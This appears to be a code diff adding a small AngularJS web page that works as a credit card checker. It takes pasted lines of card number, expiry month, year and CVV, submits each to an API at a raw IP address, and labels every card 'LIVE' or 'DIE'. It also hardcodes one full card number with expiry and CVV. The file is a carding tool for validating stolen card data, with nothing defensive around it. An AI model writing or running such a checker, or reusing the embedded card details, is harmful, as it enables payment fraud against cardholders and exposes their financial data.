@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="myApp">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Call API</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+</head>
+<body ng-controller="MainController">
+    <h1>Call API Example</h1>
+    <!-- Thêm hai ô textarea và một nút button -->
+    <textarea ng-model="input" placeholder="Enter card number" style="width: 400px; height: 200px;"></textarea>
+    <textarea ng-model="output" style="width: 400px; height: 200px;"></textarea>
+    <button ng-click="callAPI()">Call API</button>
+
+    <script>
+        const app = angular.module("myApp", []);
+        app.controller("MainController", function ($scope, $http) {
+            $scope.call = function(){
+                $http.get("http://8.222.214.49:8080/api/check?numberCard=408904100445077&month=11&year=2026&ccv=055")
+                .then((resp) => {
+                    console.log(resp);
+                });
+            }
+
+            $scope.callAPI = function() {
+                var lines = $scope.input.split('\n'); // Tách dữ liệu vào từng hàng
+                var result = ''; // Biến để tích luỹ kết quả
+                lines.forEach(function(line) {
+                    var elements = line.split(/[|\/]/);
+                    $http.get("http://8.222.214.49:8080/api/check?numberCard=" + elements[0] + 
+                    "&month=" + elements[1] + "&year=" + elements[2] + "&ccv=" + elements[3])
+                    .then(function(response) {
+                        // Khi kết quả trả về, thêm dòng dữ liệu và kết quả vào biến result
+                        result += 'LIVE - ' + line  + '\n';
+                        // Gán biến result cho ô textarea 'output'
+                        $scope.output = result;
+                    }).catch((error) =>{
+                        result += 'DIE - ' + line  + '\n';
+                        // Gán biến result cho ô textarea 'output'
+                        $scope.output = result;
+                    });
+                });
+            }
+        });
+    </script>
+</body>
+</html>
